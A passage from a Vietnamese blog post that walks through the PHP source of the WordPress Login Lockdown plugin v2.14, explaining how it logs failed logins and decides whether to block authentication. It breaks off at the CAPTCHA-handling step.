</span></span><span class="line"><span class="cl">          <span class="s1">&#39;login_attempt_IP&#39;</span> <span class="o">=&gt;</span> <span class="nv">$ip</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;failed_user&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;reason&#39;</span> <span class="o">=&gt;</span> <span class="nv">$reason</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Trong cơ sở dữ liệu, các bản ghi được lưu như sau:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from wp_login_fails<span class="p">;</span>
</span></span><span class="line"><span class="cl">+------------------+---------+---------------------+------------------+-------------+------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> login_attempt_ID <span class="p">|</span> user_id <span class="p">|</span> login_attempt_date  <span class="p">|</span> login_attempt_IP <span class="p">|</span> failed_user <span class="p">|</span> reason           <span class="p">|</span>
</span></span><span class="line"><span class="cl">+------------------+---------+---------------------+------------------+-------------+------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span>                <span class="m">5</span> <span class="p">|</span>      -1 <span class="p">|</span> 2026-01-22 03:07:05 <span class="p">|</span> 172.18.0.1       <span class="p">|</span> a           <span class="p">|</span> invalid_username <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>                <span class="m">6</span> <span class="p">|</span>      -1 <span class="p">|</span> 2026-01-22 03:24:09 <span class="p">|</span> 172.18.0.1       <span class="p">|</span> a           <span class="p">|</span> invalid_username <span class="p">|</span>
</span></span><span class="line"><span class="cl">+------------------+---------+---------------------+------------------+-------------+------------------+</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Như vậy, mỗi lần đăng nhập thất bại sẽ được ghi lại kèm theo IP, username và lý do lỗi.</p>
<h3 class="heading-element" id="authentication--block"><span>Authentication &amp; Block</span>
  <a href="#authentication--block" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Plugin can thiệp trực tiếp vào quá trình xác thực bằng cách đăng ký filter <code>authenticate</code>:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="loginlockdown.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">loginlockdown.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_filter</span><span class="p">(</span><span class="s1">&#39;authenticate&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;LoginLockdown_Functions&#39;</span><span class="p">,</span> <span class="s1">&#39;wp_authenticate_username_password&#39;</span><span class="p">),</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Hàm <code>wp_authenticate_username_password()</code> được thực thi trong quá trình đăng nhập và có vai trò kiểm soát việc cho phép hay chặn xác thực.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="functions.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">functions.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">function</span> <span class="nf">wp_authenticate_username_password</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_a</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="s1">&#39;WP_User&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$options</span> <span class="o">=</span> <span class="nx">LoginLockdown_Setup</span><span class="o">::</span><span class="na">get_options</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$whitelisted</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_ip</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$user_ip</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$whitelisted</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$whitelisted</span> <span class="o">&amp;&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">isLockedDown</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">self</span><span class="o">::</span><span class="na">lockdown_screen</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;block_message&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;lockdown_fail_count&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;&lt;strong&gt;ERROR&lt;/strong&gt;: We&#39;re sorry, but this IP has been blocked due to too many recent failed login attempts.&lt;br /&gt;&lt;br /&gt;Please try again later.&#34;</span><span class="p">,</span> <span class="s1">&#39;login-lockdown&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">is_rest_request</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$captcha</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">handle_captcha</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_wp_error</span><span class="p">(</span><span class="nv">$captcha</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;max_login_retries&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="o">::</span><span class="na">lockDown</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="s1">&#39;Too many captcha fails&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$captcha</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$userdata</span> <span class="o">=</span> <span class="nx">get_user_by</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$whitelisted</span> <span class="o">&amp;&amp;</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;max_login_retries&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;max_login_retries&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">countFails</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">self</span><span class="o">::</span><span class="na">lockDown</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="s1">&#39;Too many fails&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;lockdown_fail_count&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;&lt;strong&gt;ERROR&lt;/strong&gt;: We&#39;re sorry, but this IP has been blocked due to too many recent failed login attempts.&lt;br /&gt;&lt;br /&gt;Please try again later.&#34;</span><span class="p">,</span> <span class="s1">&#39;login-lockdown&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$error</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">(</span><span class="s1">&#39;empty_username&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;&lt;strong&gt;ERROR&lt;/strong&gt;: The username field is empty.&#39;</span><span class="p">,</span> <span class="s1">&#39;login-lockdown&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">(</span><span class="s1">&#39;empty_password&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;&lt;strong&gt;ERROR&lt;/strong&gt;: The password field is empty.&#39;</span><span class="p">,</span> <span class="s1">&#39;login-lockdown&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$error</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$userdata</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* translators: %s is the url of the WordPress lost password page. */</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;invalid_username&#39;</span><span class="p">,</span> <span class="nx">sprintf</span><span class="p">(</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;&lt;strong&gt;ERROR&lt;/strong&gt;: Invalid username. &lt;a href=&#34;%s&#34; title=&#34;Password Lost and Found&#34;&gt;Lost your password&lt;/a&gt;?&#39;</span><span class="p">,</span> <span class="s1">&#39;login-lockdown&#39;</span><span class="p">),</span> <span class="nx">site_url</span><span class="p">(</span><span class="s1">&#39;wp-login.php?action=lostpassword&#39;</span><span class="p">,</span> <span class="s1">&#39;login&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$userdata</span> <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span><span class="s1">&#39;wp_authenticate_user&#39;</span><span class="p">,</span> <span class="nv">$userdata</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_wp_error</span><span class="p">(</span><span class="nv">$userdata</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$userdata</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$userdata</span><span class="o">-&gt;</span><span class="na">user_pass</span><span class="p">)</span> <span class="o">||</span> <span class="nx">is_null</span><span class="p">(</span><span class="nv">$userdata</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">wp_check_password</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$userdata</span><span class="o">-&gt;</span><span class="na">user_pass</span><span class="p">,</span> <span class="nv">$userdata</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* translators: %s is the url of the WordPress lost password page. */</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;incorrect_password&#39;</span><span class="p">,</span> <span class="nx">sprintf</span><span class="p">(</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;&lt;strong&gt;ERROR&lt;/strong&gt;: Incorrect password. &lt;a href=&#34;%s&#34; title=&#34;Password Lost and Found&#34;&gt;Lost your password&lt;/a&gt;?&#39;</span><span class="p">,</span> <span class="s1">&#39;login-lockdown&#39;</span><span class="p">),</span> <span class="nx">site_url</span><span class="p">(</span><span class="s1">&#39;wp-login.php?action=lostpassword&#39;</span><span class="p">,</span> <span class="s1">&#39;login&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span>  <span class="k">new</span> <span class="nx">WP_User</span><span class="p">(</span><span class="nv">$userdata</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ol>
<li><strong>Bỏ qua nếu người dùng đã được xác thực</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_a</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="s1">&#39;WP_User&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Nếu WordPress đã xác thực thành công từ trước, plugin không can thiệp thêm.</p>
<ol start="2">
<li><strong>Kiểm tra whitelist và trạng thái bị khóa</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$user_ip</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$user_ip</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$whitelisted</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$whitelisted</span> <span class="o">&amp;&amp;</span> <span class="nx">self</span><span class="o">::</span><span class="na">isLockedDown</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">self</span><span class="o">::</span><span class="na">lockdown_screen</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;block_message&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;lockdown_fail_count&#39;</span><span class="p">,</span> <span class="s1">&#39;IP has been blocked&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Nếu IP không nằm trong whitelist và đang bị khóa, hệ thống sẽ chặn đăng nhập ngay lập tức.</p>
<ol start="3">
<li><strong>Bỏ qua trong một số trường hợp đặc biệt</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$username</span><span class="p">)</span> <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">is_rest_request</span><span class="p">())</span> <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Nếu không có username hoặc là REST request, plugin không áp dụng kiểm soát đăng nhập.</p>
<ol start="4">
<li><strong>Xử lý CAPTCHA</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
